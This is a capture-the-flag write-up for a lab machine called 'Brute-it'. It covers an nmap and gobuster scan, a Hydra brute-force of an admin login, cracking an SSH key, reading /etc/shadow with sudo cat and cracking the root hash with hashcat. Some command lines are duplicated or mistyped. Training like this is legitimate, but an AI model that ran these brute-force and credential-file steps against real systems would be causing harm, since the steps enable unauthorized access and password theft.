# room/Brute-it

# Enumeration

## Nmap Scan

```sh
sudo nmap -sV -sC -T4 -vv -oG nmap 10.10.56.43ORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDddsKhK0u67HTcGJWVdm5ukT2hHzo8pDwrqJmqffotf3+4uTESTdRdr2UgZhPD5ZAvVubybTc5HSVOA+CQ6eWzlmX1LDU3lsxiWEE1RF9uOVk3Kimdxp/DI8ILcJJdQlq9xywZvDZ5wwH+zxGB+mkq1i8OQuUR+0itCWembOAj1NvF4DIplYfNbbcw1qPvZgo0dA+WhPLMchn/S8T5JMFDEvV4TzhVVJM26wfBi4o0nslL9MhM74XGLvafSa5aG+CL+xrtp6oJY2wPdCSQIFd9MVVJzCYuEJ1k4oLMU1zDhANaSiScpEVpfJ4HqcdW+zFq2YAhD1a8CsAxXfMoWowd
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMPHLT8mfzU6W6p9tclAb0wb1hYKmdoAKKAqjLG8JrBEUZdFSBnCj8VOeaEuT6anMLidmNO06RAokva3MnWGoys=
|   256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEoIlLiatGPnlVn/NBlNWJziqMNrvbNTI5+JbhICdZ6/
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```sh
ORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDddsKhK0u67HTcGJWVdm5ukT2hHzo8pDwrqJmqffotf3+4uTESTdRdr2UgZhPD5ZAvVubybTc5HSVOA+CQ6eWzlmX1LDU3lsxiWEE1RF9uOVk3Kimdxp/DI8ILcJJdQlq9xywZvDZ5wwH+zxGB+mkq1i8OQuUR+0itCWembOAj1NvF4DIplYfNbbcw1qPvZgo0dA+WhPLMchn/S8T5JMFDEvV4TzhVVJM26wfBi4o0nslL9MhM74XGLvafSa5aG+CL+xrtp6oJY2wPdCSQIFd9MVVJzCYuEJ1k4oLMU1zDhANaSiScpEVpfJ4HqcdW+zFq2YAhD1a8CsAxXfMoWowd
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMPHLT8mfzU6W6p9tclAb0wb1hYKmdoAKKAqjLG8JrBEUZdFSBnCj8VOeaEuT6anMLidmNO06RAokva3MnWGoys=
|   256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEoIlLiatGPnlVn/NBlNWJziqMNrvbNTI5+JbhICdZ6/
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## Directory Discovery

```sh
gobuster dir -u 10.10.56.43/admin -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -o dirbuster.txt -x php,txt,html -q
```

```sh
/index.php            (Status: 200) [Size: 671]
/panel                (Status: 301) [Size: 316] [--> http://10.10.56.43/admin/panel/]
```

## Checking the website!

![****](/Screenshots/Brute-it/web.png)

Checking the source code! we see

```js
<!-- Hey john, if you do not remember, the username is admin -->
```

Let try to brute force the login page with Hydra

```sh
udo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.56.43 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid" 
```

![****](/Screenshots/Brute-it/hydra.png)

Let Login!


![****](/Screenshots/Brute-it/admin.png)

## SSH

Now we got the Private key, it's the time for SSH!

Let crack ```id_rea``` to get the password!

![****](/Screenshots/Brute-it/password.png)

![****](/Screenshots/Brute-it/user.png)

## Privledge Escalation

It seems we can run cat as sudo! let read /etc/shadow

We got now root hash! let crack it using hashcat

![****](/Screenshots/Brute-it/etc.png)

```sh
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
```

![****](/Screenshots/Brute-it/hashcat.png)

![****](/Screenshots/Brute-it/root.png)

Thank you!